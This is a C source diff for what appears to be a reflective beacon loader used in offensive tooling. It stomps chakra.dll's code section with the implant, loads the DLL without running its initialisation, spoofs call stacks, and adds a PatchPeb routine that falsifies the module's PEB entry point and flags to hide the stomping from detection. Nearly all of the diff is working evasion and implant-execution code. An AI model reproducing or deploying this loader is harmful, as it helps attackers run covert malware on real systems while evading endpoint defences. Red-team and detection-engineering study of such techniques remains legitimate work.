@@ -29,6 +29,8 @@ typedef struct
 
     } ntdll;
 
+    D_API( SetProcessValidCallTargets )
+
 } API, *PAPI;
 
 typedef struct
@@ -52,9 +54,11 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
 {
     PPEB    Peb;
     HANDLE  hNtdll;
+    HANDLE  hKb;
 
     Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
     hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
+    hKb    = FindModule( H_LIB_KERNELBASE, Peb, NULL );
     
     if( !hNtdll )
     {
@@ -66,6 +70,7 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );
     pApi->ntdll.LdrLoadDll              = FindFunction( hNtdll, H_API_LDRLOADDLL );
     pApi->ntdll.RtlInitUnicodeString    = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
+    pApi->SetProcessValidCallTargets    = FindFunction( hKb, H_API_SETPROCESSVALIDCALLTARGETS );
 
     if( !pApi->ntdll.NtAllocateVirtualMemory ||
         !pApi->ntdll.NtProtectVirtualMemory  ||
@@ -161,6 +166,32 @@ SECTION( B ) VOID executeBeacon( PVOID entry )
     Ent( ( HMODULE )OFFSET( Start ), 4, NULL );
 };
 
+// Patch the Entrypoint of our stomped dll in the PEB so it points to a ret. Just so PEB doesn't show signs of a module stomping
+SECTION( B ) VOID PatchPeb( PAPI Api, PVOID Module, PVOID AddrOfRet )
+{
+    PVOID                   Base   = NULL;
+    PIMAGE_NT_HEADERS       NtsHdr = NULL;
+    SIZE_T                  Length = 0;
+    CFG_CALL_TARGET_INFO    CfInfo = { 0 };
+
+    // Walk the PEB Modules, try to find the module we stomped
+    PLIST_ENTRY pModule      = ( ( PPEB ) NtCurrentTeb()->ProcessEnvironmentBlock )->Ldr->InLoadOrderModuleList.Flink;
+	PLIST_ENTRY pFirstModule = pModule;
+	do
+	{   
+        Base       = (( PLDR_DATA_TABLE_ENTRY ) pModule )->DllBase;
+        if ( Base == Module )
+        {
+            ( ( PLDR_DATA_TABLE_ENTRY ) pModule )->EntryPoint = AddrOfRet; // Need to execute a valid entrypoint; lets just do a ret
+            ( ( PLDR_DATA_TABLE_ENTRY ) pModule )->Flags = 0x8a2cc; // Flags of a normal library load it seems
+            return;
+        }
+        pModule =  pModule->Flink;
+	
+    } while ( pModule && pModule != pFirstModule );
+
+    return NULL;
+}
 SECTION( B ) VOID Loader( VOID ) 
 {
     API               Api;
@@ -182,16 +213,17 @@ SECTION( B ) VOID Loader( VOID )
     {
         calculateRegions( &Reg );
 
-        OverloadModule = FindModule( HashString( OFFSET( L"mfcore.dll" ), NULL ), NULL, NULL );
+        OverloadModule = FindModule( HashString( OFFSET( L"chakra.dll" ), NULL ), NULL, NULL );
         if ( !OverloadModule )
         {
             UNICODE_STRING      Uni = { 0 };
-            Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"mfcore.dll" ) ) );
-            SPOOF( Api.ntdll.LdrLoadDll, NULL, NULL, NULL, C_PTR( 0 ), &Uni, &OverloadModule );
+            Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"chakra.dll" ) ) );
+            ULONG flags = 0x2;
+            SPOOF( Api.ntdll.LdrLoadDll, NULL, NULL, NULL, &flags, &Uni, &OverloadModule ); // don't resolve references + don't execute dllmain stuff
         }
         OverloadNt    = C_PTR( U_PTR( OverloadModule ) + OverloadModule->e_lfanew );
         SzBackupPage  = IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
-        SzBackupPage += Reg.Full; 
+        SzBackupPage  += Reg.Full; 
         Status        = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &BackupPage, 0, &SzBackupPage, MEM_COMMIT, PAGE_READWRITE );
 
         if( Status == STATUS_SUCCESS )
@@ -209,6 +241,7 @@ SECTION( B ) VOID Loader( VOID )
 
             // Now map beacon to stomp .text
             MemoryBuffer =  U_PTR( OverloadModule ) + IMAGE_FIRST_SECTION( OverloadNt )->VirtualAddress;
+
             SPOOF( Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Full, PAGE_READWRITE, &OldProtection );
             RtlSecureZeroMemory( MemoryBuffer, Reg.Full );
             copyStub( MemoryBuffer );
@@ -216,42 +249,29 @@ SECTION( B ) VOID Loader( VOID )
             
             installHooks( Map, MemoryBuffer, Reg.NT );
 
-            // Fill in data stubs in both the backup page and the stomped .text
+            // Update data stubs in stomped .text
+            ( ( PSTUB )MemoryBuffer )->ExecRegion       = BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
+            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
+            ( ( PSTUB )MemoryBuffer )->ExecRegionSize   = Reg.Exec;
+            ( ( PSTUB )MemoryBuffer )->OriginalText     = BackupPage;
+            ( ( PSTUB )MemoryBuffer )->OriginalTextSize = IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+
+            // Fill in rest of stuff in data stubs in both the backup page and the stomped .text
             fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
             memcpy( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, MemoryBuffer, sizeof( STUB ) );
 
-            // Update data stubs in backup page and stomped .text
-            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
-            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
-            ( ( PSTUB )( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData ) )->ExecRegionSize = Reg.Exec;
-            ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
-
             // Make Stub + Mapped beacon executable + excute
             Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
+
+            // Patch the PEB Entrypoint of our stomped module
+            PatchPeb( &Api, OverloadModule, PTR_TO_HOOK( MemoryBuffer, GetRet ) );
+
             if( Status == STATUS_SUCCESS )
             {
                 executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
             };
         };
-
-        // Status = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
-        // if( Status == STATUS_SUCCESS )
-        // {
-        //     copyStub( MemoryBuffer );
-        //     Map = copyBeaconSections( MemoryBuffer, Reg );
-        //     BeaconHeap = SPOOF( Api.ntdll.RtlCreateHeap, NULL, NULL, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL  );
-        //     fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
-        //     installHooks( Map, MemoryBuffer, Reg.NT );
-
-        //     Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
-        //     Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
-        //     ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
-        //     Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
-        //     if( Status == STATUS_SUCCESS )
-        //     {
-        //         executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
-        //     };
-        // };
     };
 };
 
